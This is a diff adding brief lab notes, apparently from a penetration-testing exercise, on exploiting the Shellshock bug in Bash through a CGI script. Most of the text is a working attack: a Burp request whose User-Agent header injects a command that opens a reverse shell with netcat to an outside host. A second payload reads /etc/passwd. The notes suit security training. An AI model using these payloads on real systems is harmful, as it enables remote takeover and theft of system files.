@@ -1,0 +1,16 @@
+In burp:
+	GET /cgi-bin/status HTTP/1.1
+	Host: ptl-9172b92e-3a77e30d.libcurl.so
+	User-Agent: () { :;}; /usr/bin/nc jtharel.mooo.com 80 -e /bin/bash
+	Accept: application/json, text/javascript, */*; q=0.01
+	Accept-Language: en-US,en;q=0.5
+	Accept-Encoding: gzip, deflate
+	Referer: http://ptl-9172b92e-3a77e30d.libcurl.so/
+	X-Requested-With: XMLHttpRequest
+	Connection: close
+
+The GET request points to the /cig-bin/status which is a Bash script
+	shellshock is a vuln in bash
+
+Other User Agents to try:
+	User-Agent: () { :;}; echo $(</etc/passwd)
